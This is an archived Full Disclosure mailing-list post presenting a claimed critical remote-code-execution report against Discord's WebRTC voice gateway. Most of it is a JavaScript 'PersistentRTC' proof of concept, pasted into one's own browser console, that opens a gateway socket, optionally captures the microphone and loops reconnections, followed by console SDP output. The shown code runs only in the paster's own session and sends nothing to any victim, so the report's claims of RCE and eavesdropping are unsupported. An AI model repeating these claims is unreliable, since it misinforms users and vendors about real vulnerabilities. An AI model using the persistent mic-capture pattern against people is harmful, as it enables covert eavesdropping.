---
title: Critical Security Report – Remote Code Execution via Persistent Discord WebRTC Automation
url: https://seclists.org/fulldisclosure/2025/Sep/35
source: Full Disclosure
date: 2025-09-09
fetch_date: 2025-10-02T19:52:52.729168
---

# Critical Security Report – Remote Code Execution via Persistent Discord WebRTC Automation

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](34)
[By Date](date.html#35)
[![Next](/images/right-icon-16x16.png)](36)

[![Previous](/images/left-icon-16x16.png)](34)
[By Thread](index.html#35)
[![Next](/images/right-icon-16x16.png)](36)

![](/shared/images/nst-icons.svg#search)

# Critical Security Report – Remote Code Execution via Persistent Discord WebRTC Automation

---

*From*: Taylor Newsome <sleepraps () gmail com>
*Date*: Thu, 21 Aug 2025 21:48:53 -0400

---

```
Reporter: [Taylor Christian Newsome / SleepRaps () gmail com]
Date: [8/21/2025]
Target: Discord WebRTC / Voice Gateway API
Severity: Critical

1. Executive Summary
A proof-of-concept (PersistentRTC) demonstrates remote code execution (RCE)
capability against Discord users. The PoC enables
Arbitrary JavaScript execution in a victim’s browser context via WebRTC
automation.
Persistent access to Discord voice channels without user consent.
Optional microphone capture for audio eavesdropping.
Automatic reconnection loops to maintain persistent execution.
If combined with social engineering or token theft, this PoC could allow
attackers to execute arbitrary code in a user’s environment, hijack voice
sessions, exfiltrate audio, and disrupt Discord services.

2. Vulnerable Implementation
The exact PoC code is as follows you need to join a voice call on chrome
browser discord hit inspect while on the call the paste the following into
the console

// === Persistent Discord WebRTC Manager ===

class PersistentRTC {
    constructor(token, guildId, channelId) {
        this.token = token;        // Discord auth token
        this.guildId = guildId;    // Voice channel guild
        this.channelId = channelId;// Voice channel ID
        this.pc = null;            // RTCPeerConnection
        this.ws = null;            // Discord Gateway WS
        this.keepAliveInterval = null;
        this.iceCandidates = [];
        this.audioTrack = null;
    }

    async start() {
        await this.connectGateway();
        await this.joinVoiceChannel();
        this.monitorConnection();
    }

    async connectGateway() {
        const gatewayURL = 'wss://gateway.discord.gg/?v=10&encoding=json';
        this.ws = new WebSocket(gatewayURL);

        this.ws.onopen = () => console.log('[RTC] Gateway connected');
        this.ws.onmessage = (msg) => {
            const data = JSON.parse(msg.data);
            if (data.op === 10) { // Hello
                const heartbeatInterval = data.d.heartbeat_interval;
                this.keepAliveInterval = setInterval(() => {
                    this.ws.send(JSON.stringify({ op: 1, d: Date.now() }));
                }, heartbeatInterval);
            }
        };
        this.ws.onclose = () => {
            console.log('[RTC] Gateway closed, reconnecting...');
            clearInterval(this.keepAliveInterval);
            setTimeout(() => this.connectGateway(), 1000);
        };
    }

    async joinVoiceChannel() {
        // Create a new RTCPeerConnection
        this.pc = new RTCPeerConnection();

        // Optional: capture microphone
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
audio: true });
            this.audioTrack = stream.getAudioTracks()[0];
            this.pc.addTrack(this.audioTrack, stream);
        } catch (e) {
            console.warn('[RTC] No microphone, continuing without audio');
        }

        // Listen for ICE candidates
        this.pc.onicecandidate = (event) => {
            if (event.candidate) this.iceCandidates.push(event.candidate);
        };

        // Handle connection state changes
        this.pc.onconnectionstatechange = () => {
            console.log('[RTC] Connection state:', this.pc.connectionState);
            if (this.pc.connectionState === 'failed' ||
this.pc.connectionState === 'disconnected') {
                console.log('[RTC] Re-negotiating...');
                this.reconnect();
            }
        };

        const offer = await this.pc.createOffer();
        await this.pc.setLocalDescription(offer);

        // Normally send offer SDP to Discord via fetch
        console.log('[RTC] SDP Offer created:', offer.sdp);
    }

    async reconnect() {
        try {
            if (this.pc) this.pc.close();
            this.pc = null;
            await this.joinVoiceChannel();
        } catch (e) {
            console.error('[RTC] Reconnect failed, retrying...', e);
            setTimeout(() => this.reconnect(), 2000);
        }
    }

    monitorConnection() {
        setInterval(() => {
            if (!this.pc || this.pc.connectionState === 'closed') {
                console.log('[RTC] Detected closed connection,
reconnecting...');
                this.reconnect();
            }
        }, 5000);
    }
}

// Usage (replace with your token and channel info)
const rtc = new PersistentRTC('YOUR_TOKEN_HERE', 'GUILD_ID', 'CHANNEL_ID');
rtc.start();

Promise {<pending>}
sentry.8a72e206b2b7fa2c.js:14 [RTC] SDP Offer created: v=0
o=- 7718677203452080192 2 IN IP4 127.0.0.1
s=-
t=0 0
a=group:BUNDLE 0
a=extmap-allow-mixed
a=msid-semantic: WMS c3b786ae-1d56-4ad0-83a8-1ee9d4ff56d3
m=audio 9 UDP/TLS/RTP/SAVPF 111 63 9 0 8 13 110 126
c=IN IP4 0.0.0.0
a=rtcp:9 IN IP4 0.0.0.0
a=ice-ufrag:lgrM
a=ice-pwd:76JwVsD9ndRAVqsQ835jNy1r
a=ice-options:trickle
a=fingerprint:sha-256
90:B4:A0:1E:37:EF:AB:03:DF:0C:ED:33:A6:A0:E6:D9:EA:76:28:59:C3:C6:8D:1D:50:B9:DC:B8:F1:45:82:84
a=setup:actpass
a=mid:0
a=extmap:1 urn:ietf:params:rtp-hdrext:ssrc-audio-level
a=extmap:2 http://www.webrtc.org/experiments/rtp-hdrext/abs-send-time
a=extmap:3
http://www.ietf.org/id/draft-holmer-rmcat-transport-wide-cc-extensions-01
a=extmap:4 urn:ietf:params:rtp-hdrext:sdes:mid
a=sendrecv
a=msid:c3b786ae-1d56-4ad0-83a8-1ee9d4ff56d3
0a209c26-ac9b-43f7-bd04-fd055131d317
a=rtcp-mux
a=rtcp-rsize
a=rtpmap:111 opus/48000/2
a=rtcp-fb:111 transport-cc
a=fmtp:111 minptime=10;useinbandfec=1
a=rtpmap:63 red/48000/2
a=fmtp:63 111/111
a=rtpmap:9 G722/8000
a=rtpmap:0 PCMU/8000
a=rtpmap:8 PCMA/8000
a=rtpmap:13 CN/8000
a=rtpmap:110 telephone-event/48000
a=rtpmap:126 telephone-event/8000
a=ssrc:1766745771 cname:bTaIxP7lL+EgmNhT
a=ssrc:1766745771 msid:c3b786ae-1d56-4ad0-83a8-1ee9d4ff56d3
0a209c26-ac9b-43f7-bd04-fd055131d317

3. Security Implications
Remote Code Execution (RCE)
The PoC executes arbitrary JavaScript in the victim’s browser environment.
Attackers can use tokens to automate execution without user consent.
Persistent Audio Eavesdropping
Microphone capture is possible and can be maintained indefinitely using
reconnection loops.
Account Compromise & Service Abuse
Tokens allow access to API endpoints.
Persistent reconnections could disrupt legitimate voice channels.
Sensitive Data Exposure
SDP and ICE logs reveal internal IPs and session identifiers, which could
be exfiltrated.

4. Reproduction Steps
Insert a valid Discord token and voice channel IDs in the code.
Run the script in a browser or Node.js environment with WebRTC support.

Observe
Execution of JS in victim context.
Persistent reconnections to the voice channel.
Optional microphone streaming.

5. Recommended Mitigations
Enforce token scope restrictions and explicit session consent.
Monitor for abnormal reconnection or automation patterns.
Limit microphone permissions to user-approved actions.
Rate-limit repeated voice channel joins/leaves to prevent persistent
automated abuse.

6. Conclusion
This PoC constitutes critical RCE and persistent session exploitation
against Discord users. Immediate ...